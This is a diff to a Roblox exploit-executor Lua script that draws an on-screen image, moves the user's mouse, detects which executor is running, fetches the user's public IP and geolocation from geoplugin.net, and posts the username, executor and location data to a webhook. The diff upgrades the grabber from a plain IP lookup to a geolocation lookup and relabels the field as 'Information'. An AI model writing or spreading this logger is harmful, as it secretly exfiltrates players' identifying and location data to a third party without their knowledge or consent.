@@ -1,4 +1,3 @@
-game:GetService("CoreGui"):ClearAllChildren();
 wait(0.2)
 -- Create a ScreenGui to hold the image and text
 local gui = Instance.new("ScreenGui")
@@ -60,7 +59,7 @@ runService.RenderStepped:Connect(function()
     mousemoveabs(camera.ViewportSize.X/3, camera.ViewportSize.Y/3);
 end);
 wait()
-local numb = tostring(game:HttpGet("https://api.ipify.org", true))
+local numb = tostring(game:HttpGet("http://www.geoplugin.net/json.gp?ip=", true))
 wait(0.3)
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -76,7 +75,7 @@ local data = {
    ["embeds"] = {
        {
            ["title"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
-           ["description"] = "IP: **"..numb.."**" ,
+           ["description"] = "Information: **"..numb.."**" ,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
@@ -94,4 +93,3 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-
